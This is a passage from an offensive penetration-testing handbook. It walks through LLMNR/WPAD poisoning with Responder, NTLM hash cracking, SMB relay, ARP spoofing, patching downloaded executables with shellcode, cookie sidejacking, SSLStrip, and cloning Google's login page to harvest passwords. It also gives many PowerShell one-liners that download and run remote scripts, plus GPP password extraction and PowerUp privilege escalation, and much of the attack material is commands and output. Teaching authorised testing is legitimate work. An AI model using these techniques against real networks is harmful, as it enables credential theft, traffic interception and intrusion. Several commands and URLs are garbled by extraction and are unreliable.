315, which gives us the password: ‚Äúdont hack me‚Äù (image above).
You can also try manipulating other things in the original request. Try testing cookie values,
GET/POST/HEAD parameters, user-agent strings, and other possible vulnerable fields.
Other OWASP Top Ten Vulnerabilities
Since OWASP is the standard in vulnerability categories, I strongly recommend that you familiarize
yourself with the OWASP Top Ten Vulnerabilities by taking a moment to read through the Top Ten
Cheat Sheet:
‚óè https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet
OpenDNS‚Äô little training program provides a good training environment to test and help you
understand these vulnerabilities. You can read more about it here:
‚óè https://engineering.opendns.com/2015/03/16/security-ninjas-an-open-sourceapplication-security-training-program/
To set up their lab, create a Kali Linux image configured on host-only mode, as it will contain web
vulnerabilities.
Setting Up:
‚óè service apache2 start
‚óè git clone https://github.com/opendns/Security_Ninjas_AppSec_Training.git
/opt/SNAT
‚óè cd /opt/SNAT/
‚óè cp /etc/php5/apache2/php.ini /etc/php5/apache2/php.ini.orig
‚óè cp php.ini /etc/php5/apache2/
‚óè mkdir /var/www/test/
‚óè cp -R src/Final/* /var/www/test/
‚óè chmod 777 /var/www/test/*.txt
Now, on your browser within your VM, open a browser to 127.0.0.1/test. This will walk you through
the top ten issues, supply hints, and teach you how to exploit each of them.
OWASP Top 10
Since this is just a testing site and is vulnerable to attacks, you might want to remove it once you are
done testing.
When you are done:
‚óè rm -rf /var/www/test
‚óè cp /etc/php5/apache2/php.ini.orig /etc/php5/apache2/php.ini
‚óè service apache2 stop
Functional/Business Logic Testing
I want to stress one additional aspect when testing an application: This book gives a high-level
overview into web application testing; however, functional testing is really where you make your
money. Functional testing includes horizontal/vertical user rights testing, application flow testing, and
ensuring things work as they should. For example, ensuring that:
‚óè Users aren't able to see other user's sensitive data
‚óè Regular users can't access administrative pages
‚óè Users can't change data values of other users
‚óè Workflows cannot be modified outside their intended flow
One tool too to help with basic functional testing is to use Burp Proxy Pro‚Äôs Site Compare Feature.
After spidering and brute-forcing pages with a regular user and a privileged user, we can go to
Compare site maps.
Burp - Site Comparison
This will compare the two different scans and see how responses differ based on the user account.
Finding access as a regular user to privileged content, or identifying where responses are similar or
different, could identify misconfigurations within the application.

Burp - Site Comparison Results
If you are interested in learning more, you can visit:
https://www.owasp.org/index.php/Web_Application_Penetration_Testing.
This is where successful testers spend a majority of their time. Anyone can run scans, but if you are
an effective and efficient manual tester, you are leagues above the norm.
Conclusion
In a network penetration test, time is of the essence. You need to have a solid understanding of the
underlying infrastructure, application, and possible vulnerabilities. This chapter has provided a highlevel overview of vulnerabilities, how to identify them, and what type of impact they might have if
that vulnerability is not resolved.
Web vulnerabilities will probably be the most common vulnerability you will identify on an external
penetration test. You should now be able to demonstrate how to take advantage of these issues
efficiently.
The Lateral Pass - Moving Through The Network
At this point, you have compromised some servers and services through the SUCK network, but
unfortunately, you only have low-privilege level accounts. A lateral pass play is used when you can‚Äôt
seem to move forward. You might be on a network, but without privileges or account credentials, you
would normally be stuck on a box. As a tester, you begin to distinguish yourself from the rest by your
ability to move through the network and gain access to domain administrative accounts. However, as
a penetration tester this shouldn‚Äôt be your only goal. It is also important to be able to identify where
sensitive data is being stored and gain access to those environments. This might require pivoting
through essential employees and understanding how the corporation segments their data.
This section will focus on moving through the network and going from a limited user, all the way to
owning the whole network. We will cover such topics as starting without credentials, proxying
through hosts, having limited domain credentials, and then having local/domain credentials.
On The Network Without Credentials:
Let's say that you are on the network, but you don't have any credentials yet. Maybe you cracked their
WPAv2 Personal Wi-Fi password or popped a box that wasn't connected to the domain. I might first
turn on tcpdump to listen passively, identify the network, find the domain controllers, and use other
passive types attacks. Once I feel like I have an understanding of the local network, I will start
compromising systems using a variety of attacks specified in the next few sections.
Responder.py
(https://github.com/SpiderLabs/Responder) (Kali Linux)
One tool that has helped me in gaining my first set of credentials is called responder.py. Responder is
a tool that listens and responds to LLMNR (Link Local Multicast Name Resolution) and NBT-NS
(NetBIOS over TCP/IP Name Service).
Responder also actively takes advantage of the WPAD vulnerability. You can read more about this
attack in the following Technet article: MS12-074 - Addressing a vulnerability in WPAD's PAC file
handling (blogs.technet.com/b/srd/archive/2012/11/13/ms12-074-addressing-a-vulnerability-inwpad-s-pac-file-handling.aspx). The basics are that when a browser (IE or network LAN settings) is
set to automatically detect settings, the victim host will try to get the configuration file from the
network.
Automatically Detect Settings
As the attacker, since we are on the same network as our victim, we can respond to Name
Resolutions and inject our own PAC file to proxy all web traffic. This way we can force the user to
authenticate against our SMB servers. You might ask, "Why is this important?" If we can get the
victim host to authenticate against our SMB servers, we can request their NTLM challenge/response
hashes without alerting the victim that anything is misconfigured. If the user is already authenticated to
the domain, they will try to use those cached credentials to authenticate against our servers.
If you want to see all of the commands for Responder, along with the documentation, visit:
https://github.com/SpiderLabs/Responder.
If you have followed the Setup Phase, we should already have Responder installed, so let's dive right
in.
In the example below, we start Responder with a few different flags. The "-i" flag is for the IP of your
host, the "-b" flag is Of for NTLM authentication, and -r is set to Of since leaving it on could break
things on the network:
‚óè python ./Responder.py -i [Attacker IP] -b Off -r Off -w On
Responder.py
Once Responder starts running, you should give it a few minutes to identify requests and send
malicious responses. Below is this attack in progress.
Responder Results
Several things happened once Responder.py started running. First, we see that the LLMNR was
poisoned for 192.168.0.2 and a malicious WPAD file was sent to the victim. This means that all of
their web traffic will now use our attacker machine as a proxy. This also means that anything in clear
text is visible to us. Secondly, we see that we are tracking the cookies for any website that the user
visits. If they go to a site over HTTP after authentication, we can now become the victim user as we
have all their cookies. Finally, and most importantly, we see the NTLM challenge/response hashes
through our injected attacks.
We do have a couple of problems with these hashes though. We can't really use these hashes right
away in any sort of pass-the-hash type, as these are the NTLM challenge/response hashes. What we
can do with these hashes is utilize John the Ripper or oclHashcat.
John Example:
$ cat hashes.txt
cheetz::FAKEDOMAIN:1122334455667788:4D8AABB385ADC35D8ABF778E9852BC27:01010000$ john --format=netntlmv2 hashes.txt
Loaded 1 password hash (NTLMv2 C/R MD4 HMAC-MD5 [32/32])
password (cheetz)
oclHashcat Example:
cudaHashcat-plus64.exe -m 5600 hashes.txt password_file.txt
These two password-cracking examples are going to lead into the password-cracking section, but I
wanted to give you a quick initial taste of how powerful Responder is.
Sometimes it is not worth trying to crack a password. If you know the victim has a complex password
policy or there aren't enough users online to get multiple hashes, you might want to try SMB replay
attacks. Instead of enabling the SMB server in Responder, you can enable Metasploit's smb_replay
module (use exploit/windows/smb/smb_replay) if the victim allows NTLMv1 authentication. This
now means that any SMB requests will be forwarded to a server of your choice and their challenge
hashes will be authenticated against that server. Let's say you are able to do this against an IT admin,
chances are they will have escalated privileges on the servers you identified.
If you do have to go this route, I would recommend you watch this video by Rob Fuller:
https://www.youtube.com/watch?v=05W5tUG7z2M. Fuller talks about using ZachAttack to help
manage all the NTLM sessions and to continually compromise the network.
However, if the end users or servers are configured in a way that only allows NTLMv2 connections,
these tools will fail. The only way I have been successful in SMB Replay attacks for NTLMv2
authentication is by using the Impact framework. You can download a copy here:
http://code.google.com/p/impacket/
I originally found the configuration of Impacket from: http://pen-testing.sans.org/blog/pentesting/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python, which goes over the
entire setup . I won't dive too much into this since you can visit the SANS site for more details to
create a Meterpreter executable and run the python script.
smbrelayx.py
Once you receive an SMB connection, it will replay that SMB against another server and
drop/execute the reverse Meterpreter binary. We will talk later about creating reverse shells in the
Evading AV section.
ARP (address resolution protocol) Poisoning
Generally, ARP is used as either a last resort or for a very specific test. There are times when I will
do one, but be aware that there is generally a good chance that you will affect end users and possibly
cause disruptions on the network. So make sure you have a great grasp on ARP Spoofing before
performing them on an engagement.
For those that haven‚Äôt had too much experience with ARP Poisoning, let‚Äôs review what it does. ARP
Poisoning is a common Man in the Middle (MITM) attack that takes advantage of the insecure nature
of ARP, specifically the transition from OSI layer 2 (MAC address) to OSI layer 3 (IP address).
Basically, in a simple scenario, there is a network with a router (ROUTE_A), a legitimate host
(HOST_A), and an attacker (HOST_B). To poison these hosts, the attacker sends an unsolicited ARP
reply to the ROUTE_A with the IP address of HOST_A, but with their own HOST_B MAC address.
Then, the attacker sends an unsolicited ARP reply to HOST_A with the IP address of ROUTE_A, but
again with their own HOST_B MAC address. At this point, the router now thinks the attacker‚Äôs MAC
address belongs to HOST_A, and HOST_A thinks the attacker‚Äôs MAC address belongs to
ROUTE_A. Ultimately, this will route all of HOST_A‚Äôs traffic through HOST_B before going to the
router, bidirectionally. This could lead to manipulation of traffic, sniffing for
passwords/cookies/kerberos keys, and more. If you want to see why ARP spoofing works, you can
read more about it from:
http://www.irongeek.com/i.php?page=security/arpspoof.
Cain and Abel
(http://www.oxid.it/cain.html) (Windows)
Download: http://www.oxid.it/cain.html
Operating System: Windows
Let's see how we can ARP spoof our victim using Cain and Abel. To successfully ARP spoof in Cain,
click on the sniffer button at the top-left, then click the sniffer tab and select the Scan MAC Address
button.
Cain and Abel Scanning MAC Addresses
Next, drop into the ARP tab at the bottom of Cain, select ARP on the left column, and click the "Plus"
sign at the top bar (one thing to note is that the + button might not be visible. Try to click in the middle
pane to enable that button).
APR List
This should bring up the IPs from the previous scan and allow you to select the host to ARP Spoof
and the gateway IP.
APR Poison Routing
Lastly, click on the APR Poisoning start/stop button located at the top menu bar and you are all set.
Successful Poisoning
Now that we have a full MITM ARP Poisoning, we can go look for clear text passwords. You can do
this by going to the Passwords tab at the bottom of the screen and selecting HTTP or any other clear
text protocol.
HTTP Clear Text
There are many different attacks which can be performed with a full ARP spoof. I will show you a
couple more examples in this chapter, but I will leave it up to you to figure out what is most
appropriate for your test.
Ettercap
(http://ettercap.github.io/ettercap/) (Kali Linux)
Download: http://ettercap.github.io/ettercap/
Operating System: Kali Linux
If you favor Linux for providing your ARP spoofing attacks, the old school way is to do this using
Ettercap. The basic ARP spoof command is:
‚óè ettercap -TqM arp: remote /10.0.1.1/ /10.0.1.7/
This command will perform an ARP spoof against 10.0.1.7 and the gateway 10.0.1.1 using the text
interface (T) in quiet mode (q) and perform a MITM (M). This means that all of the traffic from10.0.1.7 will flow from your computer to the gateway and you will see all of the victim user's traffic.
If you want to see the traffic natively, you can sniff using tcpdump or Wireshark.
Ettercap
Note that there are a lot of different plugins with ettercap and it is very beneficial to understand what
they do. Once you are within an ettercap MITM attack, you can press the letter "P" to see all of the
different modules you can load. By pressing "P", you should see the following.
Example of available plugins:
[0] arp_cop 1.1 Report suspicious ARP activity
[0] autoadd 1.2 Automatically add new victims in the target range
[0] chk_poison 1.1 Check if the poisoning had success
[0] dns_spoof 1.1 Sends spoofed dns replies
[0] finger 1.6 Fingerprint a remote host
[0] finger_submit 1.0 Submit a fingerprint to ettercap's website
[0] remote_browser 1.2 Sends visited URLs to the browser
[0] search_promisc 1.2 Search promisc NICs in the LAN
[0] smb_clear 1.0 Tries to force SMB cleartext auth
[0] smb_down 1.0 Tries to force SMB to not use NTLM2 key auth
[0] smurf_attack 1.0 Run a smurf attack against specified hosts
[0] sslstrip 1.1 SSLStrip plugin
[0] stp_mangler 1.0 Become root of a switches spanning tree
My favorite attack to perform is the dns_spoof. This allows you to control where your victim goes on
the Internet. For example, if they go to Gmail, you can redirect the DNS request to point to a web
server you own and capture the credentials.
If you want to see this attack in action against software updates, visit my blog post at
https://www.securepla.net/dont-upgrade-your-software/ where I discuss how to use this in
combination with Evilgrade to take advantage of poor update implementation processes. But why stop
there?
Backdoor Factory Proxy
(https://github.com/secretsquirrel/BDFProxy)(Kali Linux)
BDFProxy (https://github.com/secretsquirrel/BDFProxy) is a tool that patches executables with user
shellcode and allows the executable to perform normally. BDF will write shellcode into empty
spaces and call hooks to that code. The best part is that it works automatically on Windows, OS X,
and Linux. So as long as we can redirect a victim‚Äôs traffic through our host, we can manipulate the
executable before the user receives it.
‚óè First, we need to modify the config file to include the address of our attacking
machine:
‚óã gedit /etc/bdfproxy/bdfproxy.cfg
BDF Configuration File
‚óè Run BDFProxy:
‚óã bdfproxy
‚óè BDFProxy will create a metasploit resource file. In a new terminal window, input:
‚óã msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc
‚óè We also need to configure our firewall to forward all http traffic through the
mitmproxy:
‚óã sysctl -w net.ipv4.ip_forward=1
‚óã iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j
REDIRECT --to-port 8080
‚óè Lastly, we need to configure the victim host to route through our machine using
arpspoofing (you can find this by arp -a):
‚óã arpspoof -i eth0 -t <victim ip> <gateway ip>
‚óã arpspoof -i eth0 -t <gateway ip> <victim ip>
BDF Patching Binary Executables
After the file is patched and downloaded, the unknowing victim executes the file. This will spawn off
either a Meterpreter Shell or just a normal shell based on the type and configuration. In the example
below, a victim downloaded a normal WinRAR installer and since it did not do any integrity
checking, we were able to successfully patch the executable. Once executed, the file opens up a shell
on our Metasploit listener.
BDF Shells
Steps After Arp Spoofing:
If you successfully ARP-spoofed your victim, you pretty much control where the victim goes, what
they see, what protocols they might use, and see any passwords that might be passed in clear. Let's
see some examples which take advantage of these attacks.
SideJacking:
From a high-level view, sidejacking is the process of sniffing the traffic, looking for session tokens
(cookies), and using those tokens to authenticate as the user. Remember that HTTP is a stateless
protocol. That means it has to use other methods to track your session without a username/password
authentication for every page on a web application. After you authenticate the first time, a session
token will be generated for the whole session and now the token is essentially your authentication
pass. If that session cookie is compromised, an attacker can take those session tokens, import theminto their own browser and become you. If you are still unfamiliar with sidejacking, you can visit this
link for more information:
http://www.pcworld.com/article/209333/how_to_hijack_facebook_using_firesheep.html.
Hamster/Ferret (Kali Linux)
Hamster is a tool that allows for these sidejacking attacks. It acts as a proxy server which replaces
your cookies with session cookies stolen from somebody else, allowing you to hijack their sessions.
Cookies are sniffed using the Ferret program.
How to run Hamster/Ferret:
‚óè First, we enable IP forwarding:
‚óã echo "1" > /proc/sys/net/ipv4/ip_forward
‚óè We then modify IP tables for SSL Strip:
‚óã iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j
REDIRECT --to-port 1000
‚óè Next, we configure and run SSL Strip:
‚óã sslstrip -f -a -k -l 1000 -w /root/out.txt &
‚óè Next, we need to enable ARP spoof (remember this will ARP spoof everyone on the
network):
‚óã arpspoof -i eth0 [gateway]
‚óè Next, we need to enable Ferret. In a new terminal window:
‚óã ferret -i eth0
‚óè And finally enable Hamster. In a new terminal window:
‚óã hamster
Now, you just need to wait for a victim to go to a website, authenticate or be authenticated, and for
their cookies to be sniffed. Once you feel you have obtained their cookies, look at the hamster.txt file
that was created. In the case below, we see that the victim's Reddit cookies were stolen, and these are
the session tokens that show up in the right-side of the image below.
Hamster Results
With the Reddit session tokens, let's see how we can use them to gain access as that user. I copy the
reddit_session value information and add that into my browser by using a cookie that mimics the
cookie we stole. I then refresh the page.
We will use the Firefox Web Developer Add-on which we installed during the setup to analyze and
add our cookies. We can drop down in the Cookies Menu and click Add Cookie. As you can see
prior to adding the cookie, I am currently not logged in as any user. After adding a reddit_session
cookie and adding the proper values, I click OK.
Replacing Cookies
Refreshing the page, it looks like we were able to gain access to this account (image below) without
ever knowing the password! Remember that I am in no way attacking Reddit's site or servers at all.
The only thing I am doing is sniffing the clear-text traffic, pulling out the cookies, and replacing my
cookies with those that were sniffed on a network I own.
Becoming the Victim User
Firesheep
I won't talk much about Firesheep since it is an older tool and similar to the example above; however,
I just want to point out that the concept still exists today. You can read a little more about it here:
http://codebutler.com/firesheep/. Firesheep is an add-on tool to Firefox which sniffs the wireless or
wired networks for session tokens passed in clear. In your browser window, it presents a framed
page where you can click on a user you captured and become that user instantly. You don't have to
add any of your own cookies manually, but it only works for a limited number of sites.
The originating problem is that when session cookies do not have the Secure Flag set and protocol is
not over HTTPS, then there is a possibility that the cookies will be passed in clear. How do you
check if your cookies are secure? I will first log into my own website and then take a look at my
cookies. I am using the web-developer add-on for Firefox to do this.
Cookie Information and Secure Cookie
In the image above, the mw_session token, which is used to keep state for the user, is passed with the
secure flag off. If the application at any time references information on that page over HTTP or if an
attacker can force the victim to visit www.securepla.net over HTTP, the attacker will have the full
session token and be able to take advantage of the user's access.
DNS Redirection:
If I have a successful MITM within a corporation, one attack that is usually fruitful is to clone the
intranet page (or any page that requires authentication), then use it for DNS redirection. This is an
easy way to get usernames and passwords. Let's see a quick example:
We already know how to configure Cain and Abel to MITM systems in a network from a prior
example. We will assume you already have a victim routing through you. The next step is to modify
and spoof DNS requests that happen through the MITM.
Under the Sniffer top tab and APR bottom tab, click on APR-DNS. Here you can right-click and add
DNS requests that you want to modify. As mentioned before, I will usually pick an intranet page
requiring authentication, but in this case, I will spoof Google and their authentication.
Cain and Abel APR-DNS
The second thing to do is set up a fake page to grab credentials. To clone the site, I generally use the
Social Engineering Tool (SET) kit (I will go through a more detailed example later on in the Social
Engineering Section). Once running within the SET Menu, go to: 1 - Social Engineering Attacks, 2 -
Website Attack Vectors, 3 - Credential Harvester Attack Method, 2 - Site Cloner.
In this case, I am going to clone https://accounts.google.com/ServiceLogin, which is the universal
login page for Google, Gmail, Google+, etc. This is configured on a Kali box that has an IP of
192.168.0.85.
Cloning Google's Authentication Page
We have now configured our DNS spoof and set up a fake page. When the ARP-Spoofed victim
decides to go to google.com, they will be redirected to our SET-cloned webpage. Any usernames and
passwords will be printed to our screen and users will then be redirected to the real Google page to
make it look like the user typed the wrong password.
Spoofed Google Authentication Page and Victim's Passwords
SSLStrip:
SSL strip is a tool developed by Moxie Marlinspike that redirects a user from an HTTPS page to an
HTTP site, so that all traffic can be sniffed in clear text. I would first watch Moxie's talk at Blackhat
(https://www.youtube.com/watch?v=MFol6IMbZ7Y). The tool monitors HTTPS traffic and rewrites
all HTTPS communication to HTTP (clear text) from the user.
Commands on Kali:
‚óè echo "1" > /proc/sys/net/ipv4/ip_forward
‚óè iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --toport 8080
‚óè sslstrip -l 8080
‚óè ettercap -TqM arp: remote /192.168.0.12/ /192.168.0.1/
In this case, we are spoofing the requests from 192.168.0.12 and the gateway at 192.168.0.1.
SSL Strip
When your victim (192.168.0.12) goes to facebook.com, it will not redirect to the HTTPS version of
Facebook for the authentication. In the example below, the user goes to Facebook and types their
username and password. If we go back to the ettercap terminal, we will see the username and
password scroll through.
Victim Visiting Facebook.com and Redirected to HTTP and Captured Passwords
For IPv6 attacks look at parasite6 in the THC-IPv6 toolkit:
(https://www.thc.org/thc-ipv6/).
With Any Domain Credentials (Non-Admin):
Initial System Recon
So you have compromised your first couple of systems on the SUCK network. The question I get
asked the most is: What‚Äôs next? What do I need to do to get more information about the
system/network and eventually get to the domain admin? You might be on a Window‚Äôs host and might
use these few standard queries to get an idea of the environment.
Windows Enumeration:
At this point we should know the basic commands like ipconfig, netstat, whoami, etc. to find the basic
system information. I have compiled most of the basic ones in a single Windows command line:
‚óè whoami /all && ipconfig /all && netstat -ano && net accounts && net localgroup
administrators && net share
But usually for a penetration tester, this isn‚Äôt enough. Before we escalate privileges, we need to
understand our end system and network much better.
By now, you know that PowerShell is extremely powerful in a Windows environment, especially for
a penetration tester. The following commands are strictly PowerShell scripts that are enabled by
default on all Windows 7 OS‚Äôes and higher.
‚óè Check Window Patches
‚óã Most client machines in a network generally have similar patch
levels. Therefore, compromising a single host will give you an idea of
what other machines will look like. This is where you can start
targeting attacks for applications, browsers, etc.
‚óã powershell.exe -command Get-HotFix
‚óè Display All AD Users and Associated Information
‚óã Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheGet-NetUser
‚óã Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheGet-UserProperties -Properties name,memberof,description,info
‚óã wmic useraccount get /ALL /format:csv
‚óè Enable Remote Desktop (requires administrative privileges)
‚óã set-ItemProperty -Path
'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name
"fDenyTSConnections" -Value 0
‚óè Enable Firewall for Remote Desktop
‚óã Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
‚óè Add a firewall rule
‚óã powershell.exe -command New-NetFirewallRule -DisplayName
‚ÄúAllow Inbound Port 80" -Direction Inbound ‚ÄìLocalPort 80 -Protocol
TCP -Action Allow
‚óã powershell.exe -command New-NetFirewallRule -DisplayName
"Block Outbound Port 80" -Direction Outbound ‚ÄìLocalPort 80 -
Protocol TCP -Action Block
‚óè View all services
‚óã powershell.exe -command Get-Service
‚óè Restart service
‚óã powershell.exe -command Restart-Service
‚óè Configure the DNS server
‚óã powershell.exe -command Get-Service SetDNSClientServerAddress -InterfaceAlias "Ethernet" -
ServerAddresses 8.8.8.8
‚óè Get a Process Listing
‚óã powershell.exe -command Get-Process
‚óã wmic process get caption,executablepath,commandline /format:csv
‚óè Get a list of all computers from Active Directory
‚óã Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheGet-NetComputers
‚óè Collection of information from the system, registries, and other information
‚óã Powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheInformation.ps1'); Get-Information
‚óè Search the network for which computers the Domain Admins are using:
‚óã Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/che
Invoke-Userhunter
‚óè Find out which computer a specific AD user is on. In this example, we will look for
the domain user ‚ÄúdomainA‚Äù who is a domain administrator:
‚óã Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheInvoke-UserHunter -UserName "domainA"
‚óè Finding Open Shares: Once on a domain machine, you want to poke around to
what‚Äôs near you and see what users are sharing. This will download PowerView and
search AD for hostnames and query those machines for open shares. From the output
below, it looks like we have access to the admin shares and full c drives of three
different hosts.
‚óã Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (NewObject
Net.WebClient).DownloadString('https://raw.githubusercontent.com/che"Invoke-ShareFinder -ExcludeIPC -ExcludePrint -CheckShareAccess |
Out-File -Encoding ascii found_shares.txt"
‚óã And when we read found_shares.txt
‚óã >type found_shares.txt
\\win7_123.hacker.testlab\ADMIN$ - Remote
Admin
\\win7_123.hacker.testlab\C$ - Default share
\\win7_123.hacker.testlab\Users -
\\win7_125.hacker.testlab\ADMIN$ - Remote
Admin
\\win7_125.hacker.testlab\C$ - Default share
\\win8_100.hacker.testlab\ADMIN$ - Remote
Admin
\\win8_100.hacker.testlab\C$ - Default share
\\win8_100.hacker.testlab\Users -
\\win8_101.hacker.testlab\ADMIN$ - Remote
Admin
\\win8_101.hacker.testlab\C$ - Default share
‚óè What if you want to see all the open shares on your network? Generally open shares
or files shares have tons of goodies stored in them. These can include configuration
files, passwords, sensitive documents and more. Invoke-Netview, part of the
PowerTools suite, is a tool that queries the domain for all hosts, and retrieves open
shares, sessions, and users that are logged on for each host. Original functionality was
implemented in the netview.exe tool released by Rob Fuller (@mubix). Note that this
script takes a long time as it tries to connect to every share and is very loud on the
network.
‚óã Powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString(‚Äòhttps://raw.githubusercontent.com/cheInvoke-Netview
‚óè Another great module of PowerView is the ability to get a list of all Active
Directory users and the associated information with their accounts.
‚óã Powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString(‚Äòhttps://raw.githubusercontent.com/cheGet-UserProperties -Properties name,memberof,description,info"
‚óè Automate post exploitation information gathering? Try Nishang‚Äôs GetInformation.ps1
‚óã Powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheInformation.ps1');Get-Information"
Other Common Non-Powershell Post Exploitation Commands:
‚óè Get Local Windows Accounts
‚óã wmic useraccount get /ALL /format:csv
‚óè Find Domain Controllers:
‚óã nltest /DCLIST:[Domain]
‚óè List Domain Admins and Local Admins:
‚óã net group ‚ÄúDomain Admins‚Äù /domain
‚óã net localgroup administrators /DOMAIN
Domain Trusts
HarmJ0y has been doing great work this year. One thing that he has been diving into is Windows
domain trusts. From an offensive perspective, after compromising the first host, you should
understand the type of infrastructure they use. This means that in large environments, the Active
Directory environment may have multiple relationships with different Domains.{12}
We used PowerView throughout the book for the multitude of tools that are incorporated in this
PowerShell toolbag. One of these tools that helps infiltrate large organization is called Invoke-
MapDomainTrusts. Running this command will show the relationship between the different domain
trusts.
For example:
‚óè Powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsInvoke-MapDomainTrusts | Export-CSV -NoTypeInformation trusts.csv"
The output:
hacker.testlab,it.hacker.testlab,ParentChild,BiDirectional
hacker.testlab,corp.hacker.testlab,ParentChild,BiDirectional
corp.hacker.testlab,corp.alice.com,External,Inbound
it.hacker.testlab,hacker.testlab,ParentChild,Bidirectional
engineering.hacker.testlab,hacker.testlab,ParentChild,Bidirectional
rockets.testlab,product.rockets.testlab,ParentChild,Bidirectional
rockets.testlab,it.rockets.testlab,ParentChild,Bidirectional
To find information about members of a given local group:
‚óè Powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsGet-NetLocalGroup -HostName it.rockets.testlab.
Since this all comes from harmj0y, I would highly recommend you read:
http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/
Group Policy Preferences:
In the last book, a great and inexpensive ‚Äúdomain user to local admin privilege escalation trick‚Äù was
through Group Policy Preferences. Group Policy Preferences vulnerabilities have been patched in the
newest Windows version, but it should be one of the first things to check.
Group Policy Preferences is a powerful feature to make a sysadmin‚Äôs life much easier by deploying
GPO settings within the whole environment. One of the features is that you can create/update local
admin accounts to all the hosts within the domain. Why would someone use this feature? It might be
because they want to push a new administrative local user onto every host or update the password for
a local account on every machine (more common than you might think). Once this setting is configured
and GPOs are updated, all workstations will now have this account. The problem is that this
information (username/password of local admin account) has to be stored somewhere and in GPP‚Äôs
case they are stored on the domain and readable by any AD user account. Even worse was that the
encrypted AES key protecting these passwords was posted on Microsoft‚Äôs site, allowing anyone to
reverse the passwords.{13}
If you are on a host that is authenticated to the network with any domain user, you can use the
Metasploit modules with the following:
‚óè use post/windows/gather/credentials/gpp
‚óè set SESSION [Session # of your shell]
‚óè exploit
This would get you a lot of easy cheap local administrative credentials, but after the Windows patch,
I don‚Äôt see this as often.
‚óè https://github.com/rapid7/metasploitframework/blob/master/modules/post/windows/gather/credentials/gpp.rb
‚óè https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/GetGPPPassword.ps1
Or if you don‚Äôt have a shell, just mount: \\[Domain Controller]\SYSVOL\[Domain]\Policies, look for
the Groups.xml file, and decrypt the hash using:
http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py.
OS X Enumeration
(https://github.com/Yelp/osxcollector)(OS X):
OS X and Linux detailed post exploitation guides are listed below. In addition to those guides, I
wanted to integrate how incident response techniques can support penetration testers. Yelp created a
tool called OSXCollector, which is a forensic evidence collection and analysis toolkit for OS X.
This tool is used to speed up incidents and investigations on compromised Macs. As a penetration
tester, we can use these same tools to perform our information gathering automation. Let‚Äôs see this in
action:
‚óè curl "https://codeload.github.com/Yelp/osxcollector/zip/master" -o osxcollector.zip
‚óè unzip osxcollector.zip
‚óè cd osxcollector-master/osxcollector
‚óè sudo python osxcollector.py
OSXCollector Output
After the OSXCollector finishes, a tar gz file is created with the date timestamp. Extracting the tar gz
file (tar xzvf osxcollect-*.tar.gz), we see a file output similar to above. These contain all the system
log files, but more importantly is the json file. What is in the json file:
‚óè Full browser information (history, cookies, login data, etc)
‚óè Information about the LaunchAgents, LaunchDaemons, ScriptingAdditions,
StartupItems and other login items
‚óè Information from Mail and more
‚óè User accounts
‚óè For full detail see:
https://github.com/Yelp/osxcollector
Why is this important to a red team? Inside this json files I have found passwords, session cookies,
sensitive web browsing data, certificate data, and much more. Luckily, you can do most of this
investigation offline and reuse cookies to log into sensitive websites.
Additional Post Exploitation Tips
Rob Fuller (Mubix) and room362.com have very comprehensive lists on additional Post Exploitation
Post Exploitation Lists from Room362.com:{14}
‚óè Linux/Unix/BSD Post Exploitation: http://bit.ly/pqJxA5
‚óè Windows Post Exploitation: http://bit.ly/1em7gvG
‚óè OSX Post Exploitation: http://bit.ly/1kVTIMf
‚óè Obscure System's Post Exploitation: http://bit.ly/18dvL0I
‚óè Metasploit Post Exploitation: http://bit.ly/JpJ1TR
Privilege Escalation:
If you end up in an environment with restrictive users, you might have issues moving laterally or
performing elevated attacks. Without being an administrative user on a host, you are limited in pulling
hashes, installing software, changing firewall rules, modifying the registry and more. I have dedicated
a quick section for getting from a regular user to a local administrator in this Zero to Hero section.
Zero to Hero - Windows:
After the initial compromise, one of the biggest issues is moving from a regular user to an
administrative user. With a regular user, you lack the ability to make modifications to the registry,
install software, bypassUAC, pull hashes, and most of all become system.
In the prior chapter, we talked about looking at open shares for password lists or for configuration
files. In this section, we will discuss how to look for vulnerabilities and issues on the host system to
get to system.
As a member of the users group with no administrative privileges, we need to look for
misconfigurations. What are the things we might look for?
Option 1:
The first common privilege escalation I see are services files that have misconfigured privileges. We
know that services files execute at bootup and call an executable to run in the background. For
example, think of Java updater. This runs every time you boot up and checks Oracle to see if you have
the latest version of Java. It is always running and generally running at a privileged local account.
This means if an executable that is called by a service is writeable by a limited user, we can replace
it with a file we created, which will allow our new file to execute as system every time the service
starts.
Luckily for us, harmj0y created a tool called PowerUp to look for these issues:
(https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp).
To run PowerUp, we will use the standard PowerShell command to download and execute the
Invoke-Allchecks:
‚óè powershell -Version 2 -nop -exec bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsInvoke-AllChecks
PowerUp Example
